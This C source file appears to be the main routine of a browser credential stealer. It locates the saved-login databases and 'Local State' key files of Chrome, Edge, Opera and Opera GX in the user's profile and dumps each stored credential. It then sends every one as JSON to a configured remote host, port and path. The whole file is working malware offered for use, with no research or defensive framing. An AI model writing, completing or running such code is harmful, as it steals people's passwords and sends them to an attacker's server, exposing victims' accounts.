#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "chromium.h"
#include "credentials.h"
#include "connection.h"
#include "json/json.h"

#include CONFIG

static char* UserProfile;
static char* PathFormat = "%s\\%s\x00";
static char* dataFormat = "%d:%s:%s:%s\n\x00";

// No (backslash/slash) before path
char* pathFromUserProfile(const char* path) {
    UserProfile = getenv("USERPROFILE");
    char* result = calloc(strlen(UserProfile) + strlen(path) + 2, sizeof(char));
    sprintf(result, PathFormat, UserProfile, path);
    return result;
}

int main()
{
    ChromiumBrowser browsers[] = {
        initChromium(pathFromUserProfile("AppData\\Local\\Google\\Chrome\\User Data\\Local State"),
                     pathFromUserProfile("AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"), 
                     "Chrome"),
        initChromium(pathFromUserProfile("AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State"),
                     pathFromUserProfile("AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data"),
                     "OperaGX"),
        initChromium(pathFromUserProfile("AppData\\Local\\Microsoft\\Edge\\User Data\\Local State"),
                     pathFromUserProfile("AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"), 
                     "Edge"),
        initChromium(pathFromUserProfile("AppData\\Roaming\\Opera Software\\Opera Stable\\Local State"),
                     pathFromUserProfile("AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"),
                     "Opera"),
    };

    HINTERNET hSession = InitSession();
    HINTERNET hConnect = Connect(hSession, HOSTNAME, atoi(PORT));

    for(register int j = 0; j < sizeof(browsers)/sizeof(browsers[0]); j++)
    {
        credList* Credentials = dumpChromium(&browsers[j]);
        for(register int i = 0; i < Credentials->size; i++)
        {
            int res = Send(hConnect, PATH, credentialToJson((Credentials->creds + i)));
            if(res != 0)
                res--;
        }
        deallocCreds(Credentials);
    }

    return 0;
}

